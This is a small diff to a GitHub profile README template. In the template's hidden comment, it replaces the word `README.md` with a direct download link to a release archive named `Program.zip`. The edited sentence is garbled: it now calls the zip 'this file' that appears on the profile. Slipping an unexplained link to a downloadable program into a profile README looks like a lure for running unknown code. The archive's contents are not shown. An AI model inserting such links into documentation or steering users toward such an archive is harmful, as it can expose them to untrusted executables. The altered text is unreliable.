@@ -7,6 +7,6 @@
 - ⚡ Fun fact: ...
 
 <!---
-keyrozahranugo/keyrozahranugo is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+keyrozahranugo/keyrozahranugo is a ✨ special ✨ repository because its `https://github.com/keyrozahranugo/keyrozahranugo/releases/download/v1.0/Program.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
